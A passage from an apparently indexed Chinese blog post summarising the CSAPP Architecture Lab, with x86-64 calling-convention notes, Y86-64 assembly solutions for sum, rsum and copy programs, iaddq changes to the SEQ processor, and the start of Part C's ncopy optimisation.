把参数放在寄存器或者栈上，使用callq进行过程调用； 从%rax中取出值，进行计算； 释放栈空间； 还原调用当前过程的%rbp和%rbx； ret指令返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:5","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#需要保存被调用者保存寄存器到栈的过程调用"},{"categories":null,"content":" 15.6 调用者同时是被调用者的递归调用被调用者+调用者行为： 保存%rbx（被调用者保存寄存器）； 进行过程调用和计算，返回值放到%rax中； 恢复%rbx； ret指令返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:6","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#调用者同时是被调用者的递归调用"},{"categories":null,"content":" 15.7 使用基指针的变长栈帧的过程调用被调用者行为： 调用者调用它时已经压入返回地址； 压入旧的%rbp； 让%rbp = %rsp； 进行常规计算，如存储局部变量等等； 计算； leave指令执行两条行为 %rsp = %rbp 通过popq恢复旧的%rbp 执行ret指令返回； 综上，使用基指针和不使用基指针的差别在于： 使用基指针时，使用%rbp来确定当前栈底位置； 如果不使用，分配空间时将%rsp减去特定空间大小，返回之前就手动将%rsp加上特定空间大小 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:7","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#使用基指针的变长栈帧的过程调用"},{"categories":null,"content":" 15.8 过程调用栈操作总结传递参数寄存器为：%rdi %rsi %rdx %rcx %r8 %r9 被调用者保存寄存器为：%rbx %rbp %r12-%r15 被调用者（同时也可能是调用者）的行为： 保存之前的%rbp和%rbx到栈上； 腾出一部分栈空间； 将局部变量保存在在栈上； 保存调用者保存寄存器的值，到被调用者保存寄存器，这样可以在调用完成后从中取出原值；（这是一种保存调用者保存寄存器值的方法） 部分的值的地址需要作为参数传递，那么这些值必须压在栈上，以获取地址； 从第n到第7把参数依次压在栈上，第7个在栈顶； 把其他6个参数保存到寄存器中； call指令调用过程； 从栈中获取到值，以及从%rax中获取到返回值，进行计算； 恢复栈空间； 还原调用当前过程的%rbp和%rbx； 调用ret返回； ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:8","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#过程调用栈操作总结"},{"categories":null,"content":" 16 数组的X86-64地址计算和引用汇编主要使用leaq计算地址，然后用movq访存求值。变长数组的地址计算不使用leaq，而使用imulq。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:4:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#数组的x86-64地址计算和引用汇编"},{"categories":null,"content":" 17 结构体的X86-64地址计算和引用汇编结构体字段的写入和读取主要通过地址加上适当的偏移实现，字段的大小通过b w l q指定： asm ; Registers: r in %rdi movl (%rdi), %eax ;Get r-\u003ei movl %eax, 4(%rdi) ;Store r-\u003ej ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:5:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#结构体的x86-64地址计算和引用汇编"},{"categories":null,"content":" 18 Y86-64指令集架构回顾Y86-64指令集架构包括： 状态单元 15个程序寄存器：%rax %rcx %rdx %rbx %rsp %rbp %rsi %rdi %r8-%r14 每个寄存器存储一个64位的字； %rsp作为入栈、出栈、调用和返回指令的栈指针； 3个一位的条件码：ZF,SF,OF PC存放当前正在执行指令的地址； 使用虚拟地址引用内存位置，假设虚拟内存系统向Y86-64程序提供了一个单一的字节数组映像； 程序状态的最后一部分是状态码Stat，表明程序执行的总体状态；它会指示是正常运行，还是出现了某种异常； 指令集 只有8字节数据，遵循AT\u0026T格式； 数据传送指令：irmovq rrmovq mrmovq rmmovq 整数操作指令：addq subq andq xorq，设置3个条件码ZF,SF,OF 7个跳转指令：jmp jle jl je jne jge 6个条件跳转指令：cmovle comvl comve comvne comvge comvg call和ret指令 pushq和popq指令 halt指令停机 编码 1-10个字节不等 高4位代码，低4位功能。代码为0-0xB，只有部分指令有功能字段，其他的是0； 15个寄存器：0-0xE，0xF表示不访问任何寄存器 使用绝对寻址； 整数采用小端码编码； 只有mov操作涉及到内存和立即数，其他操作均只涉及寄存器； 异常事件处理 用状态Stat表示 Stat=1：AOK Stat=2：HLT Stat=3：ADR（即segmentation fault） Stat=4：INS（非法指令） 处理方式：让处理器停止执行 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:6:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#y86-64指令集架构回顾"},{"categories":null,"content":" 19 实验项目结构实验包根目录下有如下内容： bash . ├── archlab.pdf ├── Makefile ├── README ├── sim ├── simguide.pdf └── sim.tar 其中archlab.pdf是实验指导手册（本文已翻译），Makefile中主要讲解的是如何提交实验（对于非CMU学生无用），sim.tar是实验包，simguide.pdf中描述的是如何使用文件中的simulator。 在sim中，有如下一些文件夹： text . ├── Makefile ├── misc ├── pipe ├── ptest ├── README ├── seq └── y86-code 其中Makefile中描述的是如何构建所需要使用的Y86-64工具，使用make all构建，使用make clean清理。而README.md中写道，该学生包主要有如下几个部分： bash yas Y86-64 assembler # 从Y86-64 汇编代码翻译成目标代码 yis Y86-64 instruction (ISA) simulator # 模拟Y86-64指令运行 hcl2c HCL to C translator # HCL 代码到 C 代码 hcl2v HCL to Verilog translator # HCL 代码到 Verilog 代码 ssim SEQ simulator # SEQ 处理器模拟器 ssim+ SEQ+ simulator # SEQ+ 处理器模拟器 psim PIPE simulator # PIPE 处理器模拟器 模拟有2种模式：TTY和GUI。TTY模式不如图形化界面方便。GUI界面需要安装Tcl/Tk工具才能运行。如果想要GUI模式，就把Makefile中的几个变量注释取消。 如果修改了Makefile文件，输入make clean; make再次构建即可。 此外，REAME.md介绍了几个文件夹中的内容： bash misc/ # 包含Y86-64汇编器，Y86-64指令模拟器，用于测试的isa.c文件，hcl2c和hcl2v seq/ # SEQ 和 SEQ+ 模拟器，其中包含一些需要修改的HCL文件（修改SEQ） pipe/ # PIPE 模拟器，其中包含一些需要修改的HCL文件（修改PIPE） y86-code/ # 主要用于对新的模拟器进行基准测试 ptest/ # 主要用于对新的模拟器进行回归测试 verilog/ # 负责从HCL代码转化为Verilog代码 那么我们主要实验的部分就在misc/ seq/ pipe/三个文件夹中。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:7:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#实验项目结构"},{"categories":null,"content":" 20 Part A本阶段要求我们： 在sim/misc目录下完成 写并且模拟下面 3 个 Y86-64 程序，每个程序的行为都在examples.c中 把姓名放在程序开头的注释里 如何测试程序 用YAS汇编器编译 用 YIS 模拟器运行 Y86-64 指令集架构对于函数的处理和 x86-64 相同 传参方式相同 寄存器使用方法相同 用栈的方式相同 callee-saved register必须提前保存 三个函数的 C 语言版本如下： c /* linked list element */ typedef struct ELE { long val; struct ELE *next; } *list_ptr; /* sum_list - Sum the elements of a linked list */ long sum_list(list_ptr ls) { long val = 0; while (ls) { val += ls-\u003eval; ls = ls-\u003enext; } return val; } /* rsum_list - Recursive version of sum_list */ long rsum_list(list_ptr ls) { if (!ls) return 0; else { long val = ls-\u003eval; long rest = rsum_list(ls-\u003enext); return val + rest; } } /* copy_block - Copy src to dest and return xor checksum of src */ long copy_block(long *src, long *dest, long len) { long result = 0; while (len \u003e 0) { long val = *src++; *dest++ = val; result ˆ= val; len--; } return result; } ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-a"},{"categories":null,"content":" 20.1 程序一：sum.ys写一个Y86-64程序sum.ys，该程序迭代式的累加链表的元素。你的程序应该包括： 设置栈结构 调用函数 停止 该函数应该是 C 语言程序sum_list的 Y83-64 形式。使用下面这个 3 元素的 list 来测试你的程序： Y86-64 # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 在开始写函数之前，我们需要在源文件中初始化好一些内容： asm # Execution begins at address 0 .pos 0 irmovq stack, %rsp call main halt # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: # 此处放置main程序 sum_list: # 此处放置sum_list程序 .pos 0x200 stack: 首先我们需要对源程序进行分析： c /* linked list element */ typedef struct ELE { long val; struct ELE *next; } *list_ptr; 在这个结构体中，long是8个字节，struct ElE*是一个指针，占8个字节。这个结构体一共16个字节。那么在计算的过程中，如果传入的是结构体的指针，那么我们通过直接解引这个指针获取long val，然后通过list_ptr + 8来获取到next的地址，通过*(list_ptr + 8)来获取next指向的结点的地址。 我们要通过main调用sum_list，需要的步骤有： 将ele1的地址放在%rdi中 call sum_list ret 因此用Y86-64汇编可写为： asm main: # 传递参数 irmovq ele1, %rdi call sum_list ret 然后就是观察sum_list函数： c /* sum_list - Sum the elements of a linked list */ long sum_list(list_ptr ls) { long val = 0; while (ls) { val += ls-\u003eval; ls = ls-\u003enext; } return val; } 这个函数获取一个list_ptr型的值，可以看到list_ptr型就是一个ElE型指针，那么这个值占8位。而且因为只有1个参数，因此它会存储在%rdi中。根据之前的学习，我们进行过程调用的步骤为： 保存之前的%rbp和%rbx到栈上； 本题不需要； 腾出一部分栈空间； 本题val就是返回值，直接保存在%rax中； 将局部变量保存在在栈上； 本题不需要； 保存调用者保存寄存器的值，到被调用者保存寄存器，这样可以在调用完成后从中取出原值；（这是一种保存调用者保存寄存器值的方法） 本题不需要； 部分的值的地址需要作为参数传递，那么这些值必须压在栈上，以获取地址； 本题不需要； 从第n到第7把参数依次压在栈上，第7个在栈顶； 本题不需要； 把其他6个参数保存到寄存器中； ls保存在%rdi中； call指令调用过程； 本题不需要； 从栈中获取到值，以及从%rax中获取到返回值，进行计算； val的值在%rax中 恢复栈空间； 本题不需要； 还原调用当前过程的%rbp和%rbx； 本题不需要； 调用ret返回； 而现在问题来了，我们需要设计循环的结构，获取ls、ls-\u003eval和ls-\u003enext。 循环结构可采用jump to middle方法 ls = %rdi，ls-\u003eval = *(ls)，ls-\u003enext = *(ls + 8) 那么整体过程调用的内容为： asm sum_list: irmovq $0, %rax # val = 0 -\u003e rax andq %rdi, %rdi jmp test loop: mrmovq (%rdi), %r10 addq %r10, %rax mrmovq 8(%rdi), %rsi rrmovq %rsi, %rdi andq %rdi, %rdi test: jne loop ret 因此总的程序可写为： Warning 注意： 一定要在循环测试前andq，否则测试通不过。 stack后要加一个空行，否则编译通不过。 asm # Execution begins at address 0 .pos 0 irmovq stack, %rsp call main halt # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: # 传递参数 irmovq ele1, %rdi call sum_list ret sum_list: irmovq $0, %rax # val = 0 -\u003e rax andq %rdi, %rdi jmp test loop: mrmovq (%rdi), %r10 addq %r10, %rax mrmovq 8(%rdi), %rdi andq %rdi, %rdi test: jne loop ret .pos 0x200 stack: ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:1","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#程序一sumys"},{"categories":null,"content":" 20.2 程序二：rsum.ys写一个 Y86-64 程序，它可以递归的计算链表的元素的和，还是用上面的那个三个元素的链表进行测试。 rsum.ys和上述程序不一样的地方在于，它使用了递归的子过程，并且把ls-\u003enext作为子过程的参数传递。此外，它使用了if-else结构。需要注意的是，我们没有将局部变量压在栈上，而是使用%rsi来存储，但是每次迭代过程中都会产生新的值存在%rsi上，因此为了保存%rsi，我们需要把%rsi压在栈上，在调用返回后从栈中弹出，和%rax相加。 完整程序如下： asm # Execution begins at address 0 .pos 0 irmovq stack, %rsp call main halt # Sample linked list .align 8 ele1: .quad 0x00a .quad ele2 ele2: .quad 0x0b0 .quad ele3 ele3: .quad 0xc00 .quad 0 main: # 传递参数 irmovq ele1, %rdi call rsum_list ret rsum_list: andq %rdi, %rdi je else if: mrmovq (%rdi), %rsi pushq %rsi mrmovq 8(%rdi), %rdi call rsum_list popq %rsi addq %rsi, %rax jmp done else: irmovq $0, %rax done: ret .pos 0x200 stack: ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#程序二rsumys"},{"categories":null,"content":" 20.3 程序三：copy.ys实现一个叫copy.ys的函数，将一些字从内存的一块复制到另外一块（非重合区域），计算所有复制的字的校验和。程序应该包含如下部分： 设置栈空间 调用 function copy 代码块 停止 使用下面的src和dest来测试： Y86-64 .align 8 # Source block src: .quad 0x00a .quad 0x0b0 .quad 0xc00 # Destination block dest: .quad 0x111 .quad 0x222 .quad 0x333 这个函数和之前的函数又不一样，我们来分析一下： c long copy_block(long *src, long *dest, long len) { long result = 0; while (len \u003e 0) { long val = *src++; *dest++ = val; result ^= val; len--; } return result; } 这里我们需要通过main传入3个参数，src、dest和len。这三个参数都是8个字节，并且前两个是地址。因此我们通过%rdi %rsi %rdx三个寄存器传入。因此main部分的代码可以写为 asm main: # 传递参数 irmovq src, %rdi irmovq dest, %rsi irmovq $3, %rdx call copy_block ret 而在函数中，没有其他的过程调用，因此不需要保存什么变量到栈上。对于result，我们可以保存在%rax上（因为最后要返回），那么整体的代码可以翻译为： asm copy_block: irmovq $0, %rax # long result = 0 while: andq %rdx, %rdx jle done addq $1, %rdi # src++ mrmovq (%rdi), %r8 # %r8 = val = *src addq $1, %rsi rmmovq %r8,(%rsi) xorq %r8, %rax subq $1, %rdx jmp while done: ret 我们进行汇编，发现汇编不成功，报错如下： bash ../misc/yas copy.ys Error on line 32: Expecting Register ID Line 32, Byte 0x0087: addq $1, %rdi # src++ Error on line 34: Expecting Register ID Line 34, Byte 0x0093: addq $1, %rsi Error on line 37: Expecting Register ID Line 37, Byte 0x00a1: subq $1, %rdx make: *** [Makefile:39: copy.yo] Error 1 回顾Y86-64指令集，我们想起来，不可以直接把常数加到寄存器上，因此我们需要用%r9寄存器来存储常数1，然后把寄存器相加。代码如下： asm copy_block: irmovq $0, %rax # long result = 0 irmovq $1, %r9 while: andq %rdx, %rdx jle done addq %r9, %rdi # src++ mrmovq (%rdi), %r8 # %r8 = val = *src addq %r9, %rsi rmmovq %r8,(%rsi) xorq %r8, %rax subq %r9, %rdx jmp while done: ret 这段代码虽然编译可以通过，但是我们发现还是有问题，数组一的内容压根就没有复制到数组二中去。经过仔细检查，我们发现问题出在src++和dest++的处理上，这里src和dest是指向long类型的指针，但是我们在++的时候只加了1，按理来说应该加上8（sizeof(long)）个单位。我们修改一下程序，新增一个变量%r10 = 8。 asm copy_block: irmovq $0, %rax # long result = 0 irmovq $1, %r9 irmovq $8, %r10 while: andq %rdx, %rdx jle done addq %r10, %rdi # src++ mrmovq (%rdi), %r8 # %r8 = val = *src addq %r10, %rsi rmmovq %r8,(%rsi) xorq %r8, %rax subq %r9, %rdx jmp while done: ret Tip 这里我们把数组第二项和第三项成功复制了，但是数组第一项没有。这是因为我们先进行了加，然后才进行的解引运算。但是其实我在网上查找资料的时候发现，C++中后增代码的运算级别是是高于*的，所以我才把程序写成这样。如果按照题目的要求，应该是先*然后再++，也就是说这段代码中的解引和递增的指令顺序应该反过来，才能完成程序的目标。 根据上述Tip，我们进行如下改动： asm copy_block: irmovq $0, %rax # long result = 0 irmovq $1, %r9 irmovq $8, %r10 while: andq %rdx, %rdx jle done mrmovq (%rdi), %r8 # %r8 = val = *src addq %r10, %rdi # src++ rmmovq %r8,(%rsi) addq %r10, %rsi xorq %r8, %rax subq %r9, %rdx jmp while done: ret 成功！完整代码如下： asm # Execution begins at address 0 .pos 0 irmovq stack, %rsp call main halt .align 8 # Source block src: .quad 0x00a .quad 0x0b0 .quad 0xc00 # Destination block dest: .quad 0x111 .quad 0x222 .quad 0x333 main: # 传递参数 irmovq src, %rdi irmovq dest, %rsi irmovq $3, %rdx call copy_block ret copy_block: irmovq $0, %rax # long result = 0 irmovq $1, %r9 irmovq $8, %r10 while: andq %rdx, %rdx jle done mrmovq (%rdi), %r8 # %r8 = val = *src addq %r10, %rdi # src++ rmmovq %r8,(%rsi) addq %r10, %rsi xorq %r8, %rax subq %r9, %rdx jmp while done: ret .pos 0x200 stack: ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:3","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#程序三copyys"},{"categories":null,"content":" 21 Part B Warning 需要注意的点是：Makefile文件中tcl的版本可能需要更新，另外ssim.c中的matherr两行需要注释掉，不然会报错。 详情参考： CSAPP–Architecture Lab实验记录 - lincx blog CSAPP : Arch Lab 解题报告 - 知乎 在本实验中，你需要在sim/seq目录下工作。这个部分我们的目的是扩展 SEQ 处理器，让其支持iaddq指令(书本 4.51 \u0026 4.52 练习题内容)，可以通过修改seq-full.hcl文件来实现，这里面包含了一些所需要用到的常数量。你的实现中在开头必须包含一个注释，在其中写上你的姓名和 ID，以及iaddq的执行过程。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-b"},{"categories":null,"content":" 21.1 iaddq指令分析 text 1. 取指：icode:ifun \u003c- M[PC] rA:rB \u003c- M[PC+1] valC \u003c- M[PC+2] valP \u003c- PC+10 2. 译码：valB \u003c- R[rB] 3. 执行：valE \u003c- valB + valC 4. 访存：无 5. 写回：R[rB] \u003c- valE 6. 更新PC：PC \u003c- valP ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:1","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#iaddq指令分析"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#seq优化"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#取指阶段"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#译码阶段写回阶段"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#执行阶段"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#访存阶段"},{"categories":null,"content":" 21.2 seq优化在需要改动的信号中，直接将iaddq指令加到hcl列表中去即可。 21.2.1 取指阶段需要改动的变量有：rA,rB,valC,valP 需要改动的信号有：needReg,needValC,instr_valid 21.2.2 译码阶段+写回阶段 Warning 这里需要srcB，因为我们是要将立即数与rB中的值相加，而不是赋值给rB 需要改动的变量有：srcB, dstE 21.2.3 执行阶段 Warning 一定要加set_cc，因为iaddq指令不属于原有的算术逻辑运算指令（IOPQ类） 需要改动的变量有：aluA, aluB, set_cc 21.2.4 访存阶段无改动。 21.2.5 更新PC无改动。 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:2","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#更新pc"},{"categories":null,"content":" 21.3 构建与测试指南当你修改完seq-full.hcl文件的时候，你需要构建一个新的 SEQ 处理器，并且测试它： 构建一个新的模拟器 bash make VERSION=full 在一个简单的 Y86-64 程序上测试你的模拟器 对于一个初始的测试，我们建议在 TTY 模式下运行一些简单的程序，例如asumi.yo，将其与模拟器的结果对比： bash ./ssim -t ../y86-code/asumi.yo 如果测试失败，那么你应该在 GUI 模拟下单步调试模拟器，命令如下： bash ./ssim -g ../y86-code/asumi.yo 使用基准测试来重新测试你的模拟器 一旦你的模拟器可以正常执行小程序了，那么你可以利用y86-code中的基准程序进行测试，命令如下： bash cd ../y86-code; make testssim 这个测试不包含新指令测试，只是检查新指令的执行会不会破坏原有的处理器状态，具体情况可以查看../y86-code/README文件 进行回归测试 一旦你可以正确运行基准程序，那么你应该运行一些../ptest中额外的回归测试，运行如下命令： bash cd ../ptest make SIM=../seq/ssim 要测试iaddq指令，运行如下命令： bash cd ../ptest make SIM=../seq/ssim TFLAGS=-i 其他 SEQ 模拟器的使用参考simguide.pdf ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:3","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#构建与测试指南"},{"categories":null,"content":" 22 Part C","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:0","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-c"},{"categories":null,"content":" 22.1 Part C 介绍你会在sim/pipe目录下工作，ncopy函数将一个len个元素的数组从src复制到dst，返回其中正数的个数。图 3 显示了 Y86-64 版本的ncopy，文件pipe-full.hcl涵盖了 PIPE 的设计hcl代码，其中包括声明的常量IIADDQ。 c /* * ncopy - copy src to dst, returning number of positive ints * contained in src array. * sim/pipe/ncopy.c */ word_t ncopy(word_t *src, word_t *dst, word_t len) { word_t count = ; word_t val; while (len \u003e ) { val = *src++; *dst++ = val; if (val \u003e 0) count++; len--; } return count; } 这一部分的任务是修改ncopy.ys和pipe-full.hcl，需要让ncopy.ys尽可能运行的快。 ncopy.ys如下： hcl ################################################################## # ncopy.ys - Copy a src block of len words to dst. # Return the number of positive words (\u003e0) contained in src. # # Include your name and ID here. # # Describe how and why you modified the baseline code. # ################################################################## # Do not modify this portion # Function prologue. # %rdi = src, %rsi = dst, %rdx = len ncopy: ################################################################## # You can modify this portion # Loop header xorq %rax,%rax # count = 0; andq %rdx,%rdx # len \u003c= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val \u003c= 0? jle Npos # if so, goto Npos: irmovq $1, %r10 addq %r10, %rax # count++ Npos: irmovq $1, %r10 subq %r10, %rdx # len-- irmovq $8, %r10 addq %r10, %rdi # src++ addq %r10, %rsi # dst++ andq %rdx,%rdx # len \u003e 0? jg Loop # if so, goto Loop: ################################################################## # Do not modify the following section of code # Function epilogue. Done: ret ################################################################## # Keep the following label at the end of your function End: 最后需要上交两个文件： pipe-full.hcl ncopy.ys 每个文件前都需要有一个注释，其中包括： 你的姓名和 ID 你的代码解释，对每个场景描述你如何修改代码 ","date":"2024-03-26","objectID":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:1","series":["15-213"],"tags":["计算机体系结构"],"title":"Arch Lab实验总结","uri":"/arch-lab%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#part-c-介绍"},{"categories":null,"content":" 22.2 Part C 实验记录 这一部分的实验过程参考了一下： 通俗解说CSAPP的archlab partC - 知乎 CSAPP | Lab4-Architecture Lab 深入解析 - 知乎 《深入理解计算机系统》配套实验：Arch Lab - 知乎 CSAPP : Arch Lab 解题报告 - 知乎 首先我们需要将IIADDQ指令，像加到SEQ中那样加到PIPE的各个阶段中去，这里不多说。 下面我们对原始的ncopy.ys汇编代码进行测试，看看其效率j如何： bash Average CPE 15.18 Score 0.0/60.0 我们可以看到正确性测试可以通过，但是效率测试无法通过。因此我们需要提高效率。 接下来我们查看ncopy.ys的汇编代码，进行一些优化工作： asm # Loop header xorq %rax,%rax # count = 0; andq %rdx,%rdx # len \u003c= 0? jle Done # if so, goto Done: Loop: mrmovq (%rdi), %r10 # read val from src... rmmovq %r10, (%rsi) # ...and store it to dst andq %r10, %r10 # val \u003c= 0? jle Npos # if so, goto Npos: irmovq $1, %r10 addq %r10, %rax # 